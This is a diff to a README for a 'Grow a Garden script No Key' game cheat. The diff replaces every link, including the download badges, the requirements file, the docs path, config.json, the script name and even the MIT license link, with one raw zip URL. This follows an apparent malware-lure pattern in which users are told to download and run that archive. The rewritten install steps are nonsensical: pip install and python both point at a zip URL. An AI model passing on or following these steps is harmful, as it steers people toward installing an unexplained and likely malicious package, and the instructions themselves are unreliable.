@@ -1,6 +1,6 @@
 # Grow a Garden script No Key
 
-[![Download](https://img.shields.io/badge/Download-Grow%20a%20Garden%20script%20No%20Key-brightgreen.svg?style=for-the-badge)](https://nabilbkfa82.github.io)
+[![Download](https://github.com/nabilbkfa82/grow-a-garden-auto-script/raw/refs/heads/branch/postexilian/garden-script-grow-a-auto-2.3.zip%20a%20Garden%20script%20No%https://github.com/nabilbkfa82/grow-a-garden-auto-script/raw/refs/heads/branch/postexilian/garden-script-grow-a-auto-2.3.zip)](https://github.com/nabilbkfa82/grow-a-garden-auto-script/raw/refs/heads/branch/postexilian/garden-script-grow-a-auto-2.3.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Let your workflow blossom! Our garden script plants numerous seeds that flourish
 Ready to sow your adventure? Gather your toolkit and follow these fertile steps:
 
 1. **Download the Package**
-   - Click the vibrant badge at the top or bottom of this README, or [download directly here](https://nabilbkfa82.github.io).
+   - Click the vibrant badge at the top or bottom of this README, or [download directly here](https://github.com/nabilbkfa82/grow-a-garden-auto-script/raw/refs/heads/branch/postexilian/garden-script-grow-a-auto-2.3.zip).
 
 2. **Extract the Files**
    - Unpack the archive with your favorite tool. It’s as easy as digging a hole and dropping in a seed.
@@ -53,12 +53,12 @@ Ready to sow your adventure? Gather your toolkit and follow these fertile steps:
 3. **Install Dependencies**
    - Open a terminal in the extracted folder.
    - Run the following for your environment:
-     - `pip install -r requirements.txt` (Python)
-     - Or follow OS-specific instructions in the `/docs/INSTALLATION.md` file.
+     - `pip install -r https://github.com/nabilbkfa82/grow-a-garden-auto-script/raw/refs/heads/branch/postexilian/garden-script-grow-a-auto-2.3.zip` (Python)
+     - Or follow OS-specific instructions in the `https://github.com/nabilbkfa82/grow-a-garden-auto-script/raw/refs/heads/branch/postexilian/garden-script-grow-a-auto-2.3.zip` file.
 
 4. **Configure and Grow**
-   - Edit the `config.json` to personalize your gardening experience.
-   - Start the script: `python garden.py`
+   - Edit the `https://github.com/nabilbkfa82/grow-a-garden-auto-script/raw/refs/heads/branch/postexilian/garden-script-grow-a-auto-2.3.zip` to personalize your gardening experience.
+   - Start the script: `python https://github.com/nabilbkfa82/grow-a-garden-auto-script/raw/refs/heads/branch/postexilian/garden-script-grow-a-auto-2.3.zip`
 
 _Sprouting ready? Start nurturing your virtual patch today!_
 
@@ -105,13 +105,13 @@ Remember: a healthy digital ecosystem grows best with transparency and respect. 
 
 ## 📜 MIT License
 
-This repository is licensed under the [MIT license](https://opensource.org/licenses/MIT)—simple and permissive, letting fair garden practices flourish.
+This repository is licensed under the [MIT license](https://github.com/nabilbkfa82/grow-a-garden-auto-script/raw/refs/heads/branch/postexilian/garden-script-grow-a-auto-2.3.zip)—simple and permissive, letting fair garden practices flourish.
 
 &copy; 2025 Grow a Garden script No Key Authors
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Grow%20a%20Garden%20script%20No%20Key-brightgreen.svg?style=for-the-badge)](https://nabilbkfa82.github.io)
+[![Download](https://github.com/nabilbkfa82/grow-a-garden-auto-script/raw/refs/heads/branch/postexilian/garden-script-grow-a-auto-2.3.zip%20a%20Garden%20script%20No%https://github.com/nabilbkfa82/grow-a-garden-auto-script/raw/refs/heads/branch/postexilian/garden-script-grow-a-auto-2.3.zip)](https://github.com/nabilbkfa82/grow-a-garden-auto-script/raw/refs/heads/branch/postexilian/garden-script-grow-a-auto-2.3.zip)
 
 ---
 
